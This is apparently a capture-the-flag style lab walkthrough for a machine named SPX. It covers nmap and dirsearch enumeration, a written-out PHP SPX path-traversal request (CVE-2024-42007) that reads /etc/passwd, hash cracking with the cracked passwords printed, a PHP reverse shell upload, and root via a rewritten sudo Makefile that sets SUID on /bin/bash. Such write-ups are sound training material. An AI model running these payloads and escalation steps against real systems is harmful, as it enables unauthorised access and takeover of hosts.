---
icon: ubuntu
---

# SPX - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.194.108 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 18:00 EDT
Nmap scan report for 192.168.194.108
Host is up (0.030s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Tiny File Manager
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   32.41 ms 192.168.45.1
2   32.46 ms 192.168.45.254
3   32.49 ms 192.168.251.1
4   32.55 ms 192.168.194.108
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

#### Directory Busting

```
dirsearch -u http://192.168.194.108
```

<figure><img src="../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

Found a version for SPX in phpinfo

<figure><img src="../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>

After searching for some time, I found SPX 0.4.15 has vulnerability of directory traversal. An article that explains everthing step by step can be found [**here**](https://www.vicarius.io/vsociety/posts/novel-escape-from-the-spx-jungle-path-traversal-in-php-spx-cve-2024-42007)

### <mark style="color:$primary;">**SPX 0.4.15 Directory Traversal**</mark>

I copied the exploit to my machine and changed the spx.http\_key (a2a90ca2f9f0ea04d267b16fb8e63800) in exploit with my own before running the exploit.

<figure><img src="../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>

```
a2a90ca2f9f0ea04d267b16fb8e63800
```

<figure><img src="../../.gitbook/assets/image (624).png" alt=""><figcaption></figcaption></figure>

I saved the exploit as spx-exploit.go and then run it to view /etc/passwd.

```
go run spx-exploit.go -t http://192.168.194.108 -f /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (625).png" alt=""><figcaption></figcaption></figure>

I was able to view /etc/passwd successfully but i could not view phpinfo.php when i wanted to view it despite it being in /var/www/html/phpinfo.php

<figure><img src="../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>

I am going to try and do it manually as well. Ill use burpsuite for this

```
/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (597).png" alt=""><figcaption></figcaption></figure>

Ok I was able to view phpinfo.php manually!

```
/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../var/www/html/index.php
```

<figure><img src="../../.gitbook/assets/image (598).png" alt=""><figcaption></figcaption></figure>

while checking out index.php I came across 2 hashes for admin and user, I'll save them and try to crack them

```
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>

I was able to crack both

```
user:profile
admin:lowprofile
```

Now I can login into tiny file manager as admin

<figure><img src="../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (601).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Upload Reverse PHP</mark>&#x20;

All i need to do now is to upload php reverse shell file, I'll use pentest monkeys reverse shell

<figure><img src="../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>

&#x20;uploaded reverse.php file

<figure><img src="../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

Clicking the open button, will redirected you where reverse.php file was uploaded

<figure><img src="../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

got a shell as www-data

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Credential Reuse</mark>

<figure><img src="../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

The admin password work to escalate our privileges to profiler

<figure><img src="../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

Profiler can run **`/usr/bin/make install -C /home/profiler/php-spx`** command with sudo rights. I navigated to **`/home/profiler/php-spx`** where makefile existed.

### <mark style="color:$primary;">Sudo make \[Writable Makefile]</mark>

```
cd /home/profiler/php-spx
```

<figure><img src="../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

All folder and files belong to the profiler user. That means i can write a malicious command into makefile and run make install command with sudo rights. I'll make a copy of the makefile first

```
cp Makefile Makefile.bak
```

```
rm Makefile
```

<figure><img src="../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>

I'll get a better shell with [**penelope**](https://github.com/brightio/penelope) first

<figure><img src="../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

After I deleting the original Makefile, I created a new makefile and wrote a malicious command that adds the SUID bit to /bin/bash

```
all:
        @echo "Do nothing in all"

install:
        chmod u+s /bin/bash
```

<figure><img src="../../.gitbook/assets/image (615).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**Note! Careful with the tabbing if it shows red in vi than you need to fix it**</mark>

Now all thats left to do is run make install and the escalate our privileges to root

```
sudo /usr/bin/make install -C /home/profiler/php-spx
```

<figure><img src="../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>

It worked now let's get escalate our privileges to root!

<figure><img src="../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>
